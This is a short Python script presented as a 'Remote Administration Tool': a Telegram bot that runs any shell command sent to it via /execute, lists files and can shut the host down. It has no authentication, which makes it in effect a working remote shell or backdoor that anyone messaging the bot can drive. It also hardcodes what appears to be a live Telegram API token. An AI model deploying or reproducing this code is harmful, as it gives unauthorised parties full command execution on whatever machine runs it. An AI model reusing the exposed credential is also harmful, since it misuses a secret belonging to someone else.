# Remote Administration Tool

import telebot
import os
import subprocess
import logging
import sys

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

API_TOKEN = '7387056294:AAEHpMzCc3Ds0196AjQxRTGo4VKRSszHPt4'
bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to the Remote Administration Tool!")
    logging.info("Bot started and user welcomed.")

@bot.message_handler(commands=['execute'])
def execute_command(message):
    try:
        command = message.text.split('/execute ', 1)[1]
        logging.info(f"Executing command: {command}")
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        bot.reply_to(message, f"Output:\n{output.decode()}")
    except IndexError:
        bot.reply_to(message, "Error: No command provided.")
        logging.error("No command provided for execution.")
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, f"Error:\n{e.output.decode()}")
        logging.error(f"Command execution failed: {e.output.decode()}")
    except Exception as e:
        bot.reply_to(message, f"An unexpected error occurred: {str(e)}")
        logging.error(f"Unexpected error: {str(e)}")

@bot.message_handler(commands=['list_files'])
def list_files(message):
    try:
        files = os.listdir('.')
        bot.reply_to(message, f"Files:\n{', '.join(files)}")
        logging.info("Files listed successfully.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred while listing files: {str(e)}")
        logging.error(f"Error listing files: {str(e)}")

@bot.message_handler(commands=['shutdown'])
def shutdown_system(message):
    bot.reply_to(message, "Shutting down the system...")
    logging.info("System shutdown initiated.")
    os.system('shutdown now')

def run_bot():
    try:
        bot.polling()
        logging.info("Bot is polling for messages.")
    except Exception as e:
        logging.error(f"Error while polling: {str(e)}")

if __name__ == "__main__":
    logging.info("Starting the Remote Administration Tool...")
    run_bot()
